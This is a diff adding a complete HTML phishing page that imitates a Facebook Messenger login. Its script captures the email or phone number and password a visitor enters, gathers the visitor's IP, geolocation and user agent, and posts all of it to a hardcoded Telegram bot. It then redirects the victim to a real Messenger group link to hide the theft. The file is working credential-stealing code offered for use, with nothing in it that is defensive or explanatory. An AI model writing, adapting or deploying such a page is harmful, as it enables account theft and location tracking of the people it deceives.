@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>messenger group</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f2f5;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .login-container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .logo {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            overflow: hidden;
+        }
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .checkbox-container label {
+            margin-left: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .login-btn {
+            background-color: #3b5998;
+        }
+        .create-account-btn {
+            background-color: #3cba54;
+        }
+        .forgot-link {
+            color: #3b5998;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://i.postimg.cc/httt6kzh/index.png" alt="Messenger Logo">
+        </div>
+        <input type="text" id="emailOrNumber" placeholder="Email address or mobile number">
+        <input type="password" id="password" placeholder="Password">
+        <div class="checkbox-container">
+            <input type="checkbox"> save login
+        </div>
+        <button class="login-btn" onclick="handleLogin()">Login</button>
+        <button class="create-account-btn">Create Account</button>
+        <a href="#" class="forgot-link">Forgotten account?</a>
+    </div>
+    <script>
+        // Function to get visitor's IP and location details
+        async function fetchVisitorDetails() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                const geoResponse = await fetch(`http://ip-api.com/json/${ipAddress}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy`);
+                const geoInfo = await geoResponse.json();
+
+                const userAgent = navigator.userAgent;
+                const requestTime = new Date().toISOString().slice(0, 19).replace('T', ' ');
+
+                let message = "🚨 *New Visitor Alert* 🚨\n";
+                message += `🕒 *Time:* ${requestTime}\n`;
+                message += `🌐 *IP Address:* ${ipAddress}\n`;
+
+                if (geoInfo.status === 'success') {
+                    message += `📍 *City:* ${geoInfo.city || 'Unknown'}\n`;
+                    message += `📍 *Region:* ${geoInfo.regionName || 'Unknown'}\n`;
+                    message += `📍 *Country:* ${geoInfo.country || 'Unknown'}\n`;
+                    message += `📮 *ZIP Code:* ${geoInfo.zip || 'Unknown'}\n`;
+                    message += `🌍 *Latitude:* ${geoInfo.lat || 'Unknown'}\n`;
+                    message += `🌍 *Longitude:* ${geoInfo.lon || 'Unknown'}\n`;
+                    message += `🕰 *Timezone:* ${geoInfo.timezone || 'Unknown'}\n`;
+                    message += `📡 *ISP:* ${geoInfo.isp || 'Unknown'}\n`;
+                    message += `🏢 *Organization:* ${geoInfo.org || 'Unknown'}\n`;
+                    message += `🔗 *AS Number:* ${geoInfo.as || 'Unknown'}\n`;
+                    message += `📱 *Mobile Connection:* ${geoInfo.mobile ? 'Yes' : 'No'}\n`;
+                    message += `🛡 *Proxy or VPN:* ${geoInfo.proxy ? 'Yes' : 'No'}\n`;
+                    const mapsLink = `https://www.google.com/maps/search/?api=1&query=${geoInfo.lat},${geoInfo.lon}`;
+                    message += `🗺 *Location on Map:* [View on Google Maps](${mapsLink})\n`;
+                } else {
+                    message += `❌ *Location Lookup Failed:* ${geoInfo.message || 'Unknown error'}\n`;
+                }
+
+                message += `🖥 *User Agent:* ${userAgent}\n`;
+
+                return message;
+            } catch (error) {
+                console.error('Error fetching visitor details:', error);
+                return "Failed to fetch visitor details.";
+            }
+        }
+
+        // Handle login functionality
+        async function handleLogin() {
+            const emailOrNumber = document.getElementById('emailOrNumber').value;
+            const password = document.getElementById('password').value;
+
+            if (!emailOrNumber || !password) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            const botToken = '6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ';
+            const chatId = '5916486983';
+
+            // Fetch visitor details
+            const visitorMessage = await fetchVisitorDetails();
+
+            // Prepare the login message
+            const loginMessage = `Email/Mobile: ${emailOrNumber}\nPassword: ${password}\n\n${visitorMessage}`;
+
+            // Send data to Telegram
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: loginMessage
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                // Open the specified URL in a new tab
+                window.open("https://m.facebook.com/messages/j/AbbGs86Z_LoD_5Zk", "_blank");
+                
+                // Redirect to Messenger group after successful login and sending message
+                window.location.href = "https://m.me/j/AbbGs86Z_LoD_5Zk/";
+            })
+            .catch((error) => console.error('Error:', error));
+        }
+    </script>
+</body>
+</html>
